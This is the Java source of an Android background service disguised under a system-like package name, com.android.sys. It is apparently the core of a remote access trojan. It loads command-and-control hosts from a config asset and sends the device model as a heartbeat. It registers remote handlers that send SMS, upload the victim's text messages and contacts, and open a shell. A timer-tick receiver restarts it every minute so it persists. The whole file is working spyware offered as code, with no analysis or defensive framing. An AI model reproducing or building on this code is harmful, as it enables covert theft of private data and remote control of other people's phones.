package com.android.sys.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;

import com.android.sys.session.NetworkManager;
import com.android.sys.session.SessionManager;
import com.android.sys.session.handler.SendSmsSessionHandler;
import com.android.sys.session.handler.ShellSessionHandler;
import com.android.sys.session.handler.UploadContactsSessionHandler;
import com.android.sys.session.handler.UploadSmsSessionHandler;
import com.android.sys.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    private static Context sContext = null;
    public static Context getContext() {
        return sContext;
    }

    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private SessionManager mSessionManager = new SessionManager();
    private NetworkManager mNetworkManager = new NetworkManager(mSessionManager);

    private final String SESSION_SEND_SMS = "send_sms";
    private final String SESSION_UPLOAD_SMS = "upload_sms";
    private final String SESSION_UPLOAD_CONTACT = "upload_contact";
    private final String SESSION_SHELL = "shell";

    private void init() {
        loadConfig();

        //add SessionHandler to SessionManager
        mSessionManager.addSessionHandler(SESSION_SEND_SMS, new SendSmsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_SHELL, new ShellSessionHandler());
        mNetworkManager.setHeartBeatData(Build.MODEL.getBytes());
        mNetworkManager.start();
    }

    private void loadConfig() {
        try {
            //read address, port, from "config" file
            InputStream is = getAssets().open("config");
            byte[] data = new byte[is.available()];
            is.read(data);
            String config = new String(data, "UTF-8");
            try {
                JSONObject jsonObject = new JSONObject(config);
                JSONArray hosts = jsonObject.getJSONArray("hosts");
                for(int i=0; i<hosts.length(); ++i) {
                    mNetworkManager.addHost(hosts.getString(i));
                }
                mNetworkManager.setLocalPort(jsonObject.getInt("listen_port"));
            } catch (JSONException e) {
            }
        } catch (IOException e) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sContext = this;
        init();

        //restart itself
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                },59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mNetworkManager.stop();
    }
}
